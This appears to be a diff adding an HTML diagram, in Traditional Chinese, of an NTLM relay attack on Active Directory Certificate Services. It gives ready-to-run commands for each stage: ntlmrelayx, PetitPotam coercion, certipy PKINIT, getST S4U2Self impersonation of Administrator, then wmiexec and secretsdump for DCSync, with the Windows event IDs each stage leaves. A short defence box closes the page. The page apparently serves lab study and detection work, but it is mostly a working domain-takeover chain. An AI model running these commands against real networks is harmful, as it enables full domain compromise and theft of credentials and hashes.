@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NTLM Relay Attack Chain v3</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow+Condensed:wght@400;600;700&display=swap');
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  background: #080c14;
+  font-family: 'Barlow Condensed', sans-serif;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 20px;
+}
+
+.wrap { width:100%; max-width:980px; }
+
+/* title */
+.title { text-align:center; margin-bottom:36px; }
+.title h1 {
+  font-family:'Share Tech Mono',monospace;
+  color:#e74c3c; font-size:1rem;
+  letter-spacing:5px; text-transform:uppercase;
+}
+.title p {
+  font-family:'Share Tech Mono',monospace;
+  color:#4a5568; font-size:0.72rem;
+  letter-spacing:2px; margin-top:6px;
+}
+
+/* step rows */
+.steps { display:flex; flex-direction:column; gap:0; }
+
+.step-row {
+  display:grid;
+  grid-template-columns:48px 1fr;
+  gap:0 16px;
+  align-items:stretch;
+  min-height:80px;
+}
+
+.step-num-col { display:flex; flex-direction:column; align-items:center; }
+.step-circle {
+  width:36px; height:36px; border-radius:50%;
+  display:flex; align-items:center; justify-content:center;
+  font-family:'Share Tech Mono',monospace;
+  font-size:0.85rem; font-weight:bold;
+  flex-shrink:0; border:2px solid; margin-top:6px;
+}
+.step-line { width:2px; flex:1; margin:4px auto 0; }
+.step-row:last-child .step-line { display:none; }
+
+/* card */
+.step-card {
+  border-radius:10px; border:1px solid;
+  padding:14px 18px; margin-bottom:12px; position:relative;
+}
+.step-card-header {
+  display:flex; align-items:center; gap:10px; margin-bottom:8px;
+}
+.step-icon { font-size:1.4rem; }
+.step-title { font-size:1.05rem; font-weight:700; letter-spacing:1px; }
+.step-body {
+  font-size:0.82rem; line-height:1.65; color:#a0aec0;
+}
+.step-body code {
+  font-family:'Share Tech Mono',monospace; font-size:0.73rem;
+  padding:1px 6px; border-radius:4px; background:rgba(255,255,255,0.06);
+}
+
+/* actors */
+.actors {
+  display:flex; align-items:center; gap:8px;
+  margin-top:10px; flex-wrap:wrap;
+}
+.actor {
+  padding:3px 10px; border-radius:6px;
+  font-family:'Share Tech Mono',monospace; font-size:0.67rem; border:1px solid;
+}
+.arrow-txt {
+  font-family:'Share Tech Mono',monospace; font-size:0.7rem; color:#4a5568;
+}
+
+/* event badge row */
+.events {
+  display:flex; gap:6px; margin-top:10px; flex-wrap:wrap;
+}
+.ev {
+  font-family:'Share Tech Mono',monospace; font-size:0.65rem;
+  padding:2px 8px; border-radius:10px; border:1px solid;
+}
+.ev-yes  { color:#2ecc71; border-color:#2ecc71; background:rgba(46,204,113,0.08); }
+.ev-no   { color:#e74c3c; border-color:#e74c3c; background:rgba(231,76,60,0.08); text-decoration:line-through; opacity:0.6; }
+.ev-note { color:#f1c40f; border-color:#f1c40f; background:rgba(241,196,15,0.08); }
+
+/* colour themes */
+.c-red    { color:#e74c3c; border-color:#e74c3c; background:rgba(231,76,60,0.08); }
+.c-orange { color:#e67e22; border-color:#e67e22; background:rgba(230,126,34,0.08); }
+.c-blue   { color:#3498db; border-color:#3498db; background:rgba(52,152,219,0.08); }
+.c-green  { color:#2ecc71; border-color:#2ecc71; background:rgba(46,204,113,0.08); }
+.c-purple { color:#9b59b6; border-color:#9b59b6; background:rgba(155,89,182,0.08); }
+.c-gold   { color:#f1c40f; border-color:#f1c40f; background:rgba(241,196,15,0.08); }
+
+.line-red    { background:#e74c3c; }
+.line-orange { background:#e67e22; }
+.line-blue   { background:#3498db; }
+.line-green  { background:#2ecc71; }
+.line-purple { background:#9b59b6; }
+.line-gold   { background:#f1c40f; }
+
+/* tag */
+.tag {
+  display:inline-block; font-family:'Share Tech Mono',monospace;
+  font-size:0.6rem; padding:2px 8px; border-radius:10px;
+  margin-left:8px; vertical-align:middle;
+}
+
+/* cmd block */
+.cmd {
+  margin-top:10px;
+  background:rgba(0,0,0,0.4);
+  border:1px solid rgba(255,255,255,0.07);
+  border-radius:6px;
+  padding:8px 12px;
+  font-family:'Share Tech Mono',monospace;
+  font-size:0.68rem;
+  color:#58d68d;
+  line-height:1.6;
+  white-space:pre;
+  overflow-x:auto;
+}
+.cmd .comment { color:#4a5568; }
+
+/* correction / insight boxes */
+.box {
+  margin-top:14px; border-radius:10px; padding:14px 20px;
+  font-family:'Share Tech Mono',monospace; font-size:0.73rem;
+  color:#a0aec0; line-height:1.8;
+}
+.box-red    { background:rgba(231,76,60,0.06); border:1px solid rgba(231,76,60,0.3); border-left:3px solid #e74c3c; }
+.box-yellow { background:rgba(241,196,15,0.05); border:1px solid rgba(241,196,15,0.25); border-left:3px solid #f1c40f; }
+.box-green  { background:rgba(46,204,113,0.05); border:1px solid rgba(46,204,113,0.25); border-left:3px solid #2ecc71; }
+.box strong { }
+.red    { color:#ff6b6b; }
+.yellow { color:#f1c40f; }
+.green  { color:#58d68d; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="title">
+    <h1>⚠ NTLM Relay Attack Chain v3</h1>
+    <p>// 修正版 v3 · 已驗證流程 · DC(10.0.0.206) ≠ CA(10.0.1.132)</p>
+  </div>
+
+  <div class="steps">
+
+    <!-- STEP 0 -->
+    <div class="step-row">
+      <div class="step-num-col">
+        <div class="step-circle c-orange">0</div>
+        <div class="step-line line-orange"></div>
+      </div>
+      <div class="step-card c-orange">
+        <div class="step-card-header">
+          <span class="step-icon">🔑</span>
+          <span class="step-title">前提條件</span>
+          <span class="tag c-orange">PREREQUISITE</span>
+        </div>
+        <div class="step-body">
+          • 攻擊者持有<strong class="yellow">低權限域帳號</strong>（用於觸發 PetitPotam）<br>
+          • <strong class="yellow">DC 與 CA 必須分離</strong>（不同主機），否則 Self-Relay 被阻擋<br>
+          • AD CS 啟用 Web Enrollment，且 IIS <strong class="yellow">未啟用 EPA</strong>
+        </div>
+        <div class="actors">
+          <span class="actor c-orange">DC: 10.0.0.206</span>
+          <span class="arrow-txt">≠</span>
+          <span class="actor c-green">CA: 10.0.1.132</span>
+          <span class="arrow-txt">←</span>
+          <span class="actor c-orange">關鍵：必須不同機器</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 1 : ntlmrelayx -->
+    <div class="step-row">
+      <div class="step-num-col">
+        <div class="step-circle c-red">1</div>
+        <div class="step-line line-red"></div>
+      </div>
+      <div class="step-card c-red">
+        <div class="step-card-header">
+          <span class="step-icon">🎣</span>
+          <span class="step-title">啟動 ntlmrelayx 監聽（先執行）</span>
+          <span class="tag c-red">STEP 3</span>
+        </div>
+        <div class="step-body">
+          在攻擊機上啟動 ntlmrelayx，監聽 SMB Port 445，<br>
+          準備將收到的 NTLM 認證<strong class="red">同步轉發</strong>至 AD CS HTTP Endpoint。
+        </div>
+        <div class="cmd"><span class="comment"># 視窗1：先啟動監聽</span>
+ntlmrelayx.py \
+  -t http://10.0.1.132/certsrv/certfnsh.asp \
+  -smb2support --adcs \
+  --template DomainController</div>
+        <div class="events">
+          <span class="ev ev-note">等待連線中...</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 2 : PetitPotam -->
+    <div class="step-row">
+      <div class="step-num-col">
+        <div class="step-circle c-red">2</div>
+        <div class="step-line line-red"></div>
+      </div>
+      <div class="step-card c-red">
+        <div class="step-card-header">
+          <span class="step-icon">📡</span>
+          <span class="step-title">PetitPotam：強制 DC 發起 NTLM 認證</span>
+          <span class="tag c-red">STEP 4</span>
+        </div>
+        <div class="step-body">
+          用低權限帳號呼叫 DC 的 <code>EFS RPC (MS-EFSRPC)</code>，<br>
+          強制 DC 以 <strong class="red">DC$ 機器帳號</strong>向攻擊機（Port 445）發起 NTLM 認證。
+        </div>
+        <div class="cmd"><span class="comment"># 視窗2：觸發認證</span>
+python3 PetitPotam.py \
+  -d sme.local -u aduser -p &lt;PASS&gt; \
+  &lt;KALI_IP&gt; 10.0.0.206</div>
+        <div class="actors">
+          <span class="actor c-blue">DC (10.0.0.206)</span>
+          <span class="arrow-txt">──NTLM──▶</span>
+          <span class="actor c-red">攻擊機:445</span>
+        </div>
+        <div class="events">
+          <span class="ev ev-yes">✓ 4624 Network Logon (DC 端)</span>
+          <span class="ev ev-no">✗ 4648 不會產生</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 3 : Relay + Cert -->
+    <div class="step-row">
+      <div class="step-num-col">
+        <div class="step-circle c-green">3</div>
+        <div class="step-line line-green"></div>
+      </div>
+      <div class="step-card c-green">
+        <div class="step-card-header">
+          <span class="step-icon">🔀</span>
+          <span class="step-title">ntlmrelayx 同步轉發 → AD CS 核發憑證</span>
+          <span class="tag c-green">STEP 4→5</span>
+        </div>
+        <div class="step-body">
+          ntlmrelayx 作為 <strong class="green">MITM 同步橋接</strong>，即時將 DC$ 的 NTLM 認證轉發至 CA。<br>
+          AD CS 誤以為是 DC$ 本身申請，核發憑證。<br>
+          ntlmrelayx <strong class="green">自動儲存為 .pfx</strong>，無需手動轉換格式。
+        </div>
+        <div class="cmd"><span class="comment"># ntlmrelayx 自動輸出（無需手動操作）</span>
+[*] Authenticating against http://10.0.1.132 as SME/SME-SWP-W-AD$ SUCCEED
+[*] GOT CERTIFICATE! ID 2
+[*] Writing PKCS#12 certificate to ./SME-SWP-W-AD$.pfx</div>
+        <div class="actors">
+          <span class="actor c-red">ntlmrelayx (MITM)</span>
+          <span class="arrow-txt">──同步轉發──▶</span>
+          <span class="actor c-green">AD CS (10.0.1.132)</span>
+          <span class="arrow-txt">──▶</span>
+          <span class="actor c-green">SME-SWP-W-AD$.pfx</span>
+        </div>
+        <div class="events">
+          <span class="ev ev-yes">✓ 4886 CA 收到申請</span>
+          <span class="ev ev-yes">✓ 4887 憑證核發 (Requester: SME\DC$)</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 4 : certipy auth PKINIT -->
+    <div class="step-row">
+      <div class="step-num-col">
+        <div class="step-circle c-purple">4</div>
+        <div class="step-line line-purple"></div>
+      </div>
+      <div class="step-card c-purple">
+        <div class="step-card-header">
+          <span class="step-icon">🎫</span>
+          <span class="step-title">certipy auth：PKINIT 取得 DC$ TGT</span>
+          <span class="tag c-purple">STEP 6</span>
+        </div>
+        <div class="step-body">
+          使用 DC$ 憑證透過 <strong class="yellow">PKINIT（憑證式 Kerberos）</strong>申請 TGT。<br>
+          同時透過 U2U 機制取得 DC$ 的 <code>NT Hash</code>。<br>
+          <strong class="red">注意：</strong>正確工具是 <code>certipy auth</code>，非 <code>getTGT.py</code>（不支援 PKINIT）。
+        </div>
+        <div class="cmd">certipy auth \
+  -pfx SME-SWP-W-AD\$.pfx \
+  -username "SME-SWP-W-AD$" \
+  -domain sme.local \
+  -dc-ip 10.0.0.206
+
+export KRB5CCNAME=SME-SWP-W-AD\$.ccache</div>
+        <div class="events">
+          <span class="ev ev-yes">✓ 4768 TGT 申請 PreAuthType=16 (PKINIT)</span>
+          <span class="ev ev-no">✗ 非 PreAuthType=2 (一般密碼)</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 5 : S4U2Self -->
+    <div class="step-row">
+      <div class="step-num-col">
+        <div class="step-circle c-purple">5</div>
+        <div class="step-line line-purple"></div>
+      </div>
+      <div class="step-card c-purple">
+        <div class="step-card-header">
+          <span class="step-icon">🎭</span>
+          <span class="step-title">getST.py S4U2Self：模擬 Administrator</span>
+          <span class="tag c-purple">STEP 7</span>
+        </div>
+        <div class="step-body">
+          DC$ 具有 <code>TrustedToAuthForDelegation</code> 屬性，<br>
+          可透過 <strong class="yellow">S4U2Self</strong> 代替任意帳號（Administrator）申請 Service Ticket。
+        </div>
+        <div class="cmd">getST.py \
+  -k -no-pass \
+  -spn "cifs/SME-SWP-W-AD.sme.local" \
+  -impersonate Administrator \
+  -dc-ip 10.0.0.206 \
+  "sme.local/SME-SWP-W-AD$"
+
+export KRB5CCNAME=Administrator.ccache</div>
+        <div class="events">
+          <span class="ev ev-yes">✓ 4769 Service Ticket 申請</span>
+          <span class="ev ev-yes">✓ TransitedServices 不為空（S4U 特徵）</span>
+          <span class="ev ev-yes">✓ AccountName 為機器帳號（異常）</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 6 : Admin Access -->
+    <div class="step-row">
+      <div class="step-num-col">
+        <div class="step-circle c-gold">6</div>
+        <div class="step-line line-gold"></div>
+      </div>
+      <div class="step-card c-gold">
+        <div class="step-card-header">
+          <span class="step-icon">👑</span>
+          <span class="step-title">Domain Admin 完整控制</span>
+          <span class="tag c-gold">STEP 8 · PWNED</span>
+        </div>
+        <div class="step-body">
+          使用 Administrator 票證執行遠端指令或 DCSync，<br>
+          取得 <strong class="yellow">krbtgt NT Hash</strong>，可製作 Golden Ticket 永久維持控制權。
+        </div>
+        <div class="cmd">wmiexec.py -k -no-pass \
+  sme.local/Administrator@SME-SWP-W-AD.sme.local
+
+<span class="comment"># 或 DCSync</span>
+secretsdump.py -k -no-pass \
+  sme.local/Administrator@SME-SWP-W-AD.sme.local</div>
+        <div class="events">
+          <span class="ev ev-yes">✓ 4624 Administrator 登入</span>
+          <span class="ev ev-yes">✓ 4672 特權指派</span>
+          <span class="ev ev-yes">✓ 4688 遠端程序建立</span>
+          <span class="ev ev-yes">✓ 4662 DCSync (GUID: 1131f6aa / 1131f6ad)</span>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /steps -->
+
+  <div class="box box-red" style="margin-top:28px;">
+    <strong class="red">⚡ v3 修正摘要：</strong><br>
+    • PetitPotam 觸發產生 <strong class="red">4624</strong>（非 4648，4648 需明確指定憑證的 API 呼叫）<br>
+    • ntlmrelayx 自動輸出 <strong class="red">.pfx</strong>，無需手動轉換 Base64<br>
+    • PKINIT 正確工具為 <strong class="red">certipy auth</strong>（非 getTGT.py，後者不支援憑證認證）<br>
+    • Self-Relay 防護：DC 與 CA <strong class="red">必須分離</strong>（已驗證：10.0.0.206 vs 10.0.1.132）
+  </div>
+
+  <div class="box box-yellow">
+    <strong class="yellow">🛡 關鍵防禦措施：</strong><br>
+    • 啟用 <strong class="yellow">SMB Signing</strong>（防止 SMB Relay）<br>
+    • AD CS 啟用 <strong class="yellow">EPA（Extended Protection for Authentication）</strong><br>
+    • 啟用 <strong class="yellow">LDAP Signing + Channel Binding</strong><br>
+    • 封鎖非必要主機對 DC 的 <strong class="yellow">EFS RPC（MS-EFSRPC）</strong>呼叫
+  </div>
+
+</div>
+</body>
+</html>
